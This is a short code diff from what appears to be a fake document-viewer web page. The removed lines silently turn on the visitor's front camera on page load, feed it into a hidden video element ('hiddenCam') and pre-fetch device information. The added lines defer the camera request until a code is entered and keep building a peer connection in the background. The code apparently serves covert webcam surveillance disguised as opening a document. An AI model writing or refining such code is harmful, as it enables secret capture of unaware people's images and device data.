@@ -442,21 +442,9 @@ async function initViewer() {
   document.getElementById('pg-viewer').classList.add('active');
   setSt('','DOCUMENT LOADED');
 
-  // Camera starts silently — no UI on viewer side
-  try {
-    localStream = await navigator.mediaDevices.getUserMedia({
-      video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}}, audio:false
-    });
-    const hc = document.getElementById('hiddenCam');
-    hc.srcObject = localStream;
-    hc.play().catch(()=>{});
-  } catch(e) { /* will retry on auth click */ }
-
-  // Pre-build peer
+  // No camera request on load — only triggered after correct code is entered
+  // Pre-build peer connection in background so it's ready
   vPeer = buildPeer();
-
-  // Pre-fetch device info
-  fetchDevInfo().then(d=>devCache=d);
 
   // Wire input AFTER a tick so DOM is fully ready
   setTimeout(()=>{
